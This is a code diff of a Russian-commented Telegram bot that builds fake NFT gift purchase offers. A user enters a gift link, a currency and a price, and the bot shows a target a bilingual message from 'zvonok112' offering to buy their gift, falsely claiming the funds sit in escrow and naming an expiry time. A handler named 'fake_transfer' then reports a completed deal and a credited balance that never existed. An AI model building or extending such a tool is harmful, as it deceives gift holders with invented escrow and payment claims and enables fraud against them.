@@ -57,16 +57,25 @@ async def start_create(message: types.Message, state: FSMContext):
 async def process_nft_link(message: types.Message, state: FSMContext):
     await state.update_data(nft_link=message.text)
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💎 (Stars/TON)", callback_data="cur_diamond")],
-        [InlineKeyboardButton(text="💵 (USDT)", callback_data="cur_usdt")]
+        [InlineKeyboardButton(text="⭐ Stars", callback_data="cur_stars")],
+        [InlineKeyboardButton(text="💎 TON", callback_data="cur_ton")],
+        [InlineKeyboardButton(text="💎 Gram", callback_data="cur_gram")],
+        [InlineKeyboardButton(text="💵 USDT", callback_data="cur_usdt")]
     ])
     await message.answer("Выбери валюту:", reply_markup=kb)
     await state.set_state(OfferForm.currency)
 
 @dp.callback_query(OfferForm.currency)
 async def process_currency(callback: types.CallbackQuery, state: FSMContext):
-    currency_map = {"cur_diamond": "💎", "cur_usdt": "💵"}
-    await state.update_data(currency=currency_map.get(callback.data, "💎"))
+    # Названия валют для текста (иконки)
+    currency_map = {
+        "cur_stars": "⭐", 
+        "cur_ton": "💎", 
+        "cur_gram": "💎", 
+        "cur_usdt": "💵"
+    }
+    cur_code = callback.data.replace("cur_", "")
+    await state.update_data(currency=currency_map.get(callback.data, "💎"), currency_code=cur_code)
     await callback.message.edit_text("Введи цену (число, например: 7):")
     await state.set_state(OfferForm.price)
 
@@ -118,25 +127,34 @@ async def handle_start(message: types.Message, state: FSMContext):
     
     nft_link, currency, price, lang = row
     
+    # 1. ОТПРАВЛЯЕМ САМУ ССЫЛКУ (TELEGRAM САМ РАЗВЕРНЕТ ЕЕ В КАРТИНКУ)
+    try:
+        await message.answer(nft_link)
+    except Exception:
+        pass # Игнорируем ошибку, если Telegram не смог подтянуть превью
+
+    # 2. ОТПРАВЛЯЕМ ТЕКСТ С ЦЕНОЙ И КНОПКОЙ
     if lang == "RU":
-        text = (f"🎁 Пользователь zvonok112\nпредлагает купить ваш подарок\n"
-                f"FaithAmulet #82365 за {int(price)} {currency}.\n\n"
-                f"Сумма будет зарезервирована на эскроу-счёте и зачислена на ваш баланс "
-                f"после передачи подарка.\n\nПредложение действует ещё 21ч 26м.")
-        btn_text = "ПОКАЗАТЬ ПОДАРОК"
+        text = (
+            f"🎁 Пользователь zvonok112\nпредлагает купить ваш подарок\n"
+            f"FaithAmulet #82365 за {int(price)} {currency}.\n\n"
+            f"Сумма будет зарезервирована на эскроу-счёте и зачислена на ваш баланс "
+            f"после передачи подарка.\n\nПредложение действует ещё 21ч 26м."
+        )
         transfer_btn = "Передать подарок"
     else:
-        text = (f"🎁 User zvonok112\nwants to buy your gift\n"
-                f"FaithAmulet #82365 for {int(price)} {currency}.\n\n"
-                f"Amount is locked in escrow and will be credited after you transfer the gift.\n\n"
-                f"Offer expires in 21h 26m.")
-        btn_text = "SHOW GIFT"
+        text = (
+            f"🎁 User zvonok112\nwants to buy your gift\n"
+            f"FaithAmulet #82365 for {int(price)} {currency}.\n\n"
+            f"Amount is locked in escrow and will be credited after you transfer the gift.\n\n"
+            f"Offer expires in 21h 26m."
+        )
         transfer_btn = "Transfer Gift"
         
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=btn_text, url=nft_link)],
         [InlineKeyboardButton(text=transfer_btn, callback_data=f"fake_transfer_{token}")]
     ])
+    
     await message.answer(text, reply_markup=kb)
 
 @dp.callback_query(F.data.startswith("fake_transfer_"))
@@ -150,9 +168,11 @@ async def process_fake_transfer(callback: types.CallbackQuery):
     
     nft_link, price, currency = row
     
-    text = (f"✅ Сделка успешно завершена!\n\n"
-            f"Вы передали подарок. {int(price)} {currency} зачислены на ваш баланс.\n"
-            f"Спасибо за использование сервиса.")
+    text = (
+        f"✅ Сделка успешно завершена!\n\n"
+        f"Вы передали подарок. {int(price)} {currency} зачислены на ваш баланс.\n"
+        f"Спасибо за использование сервиса."
+    )
     
     await callback.message.edit_text(text)
     await callback.answer("Сделка завершена.")
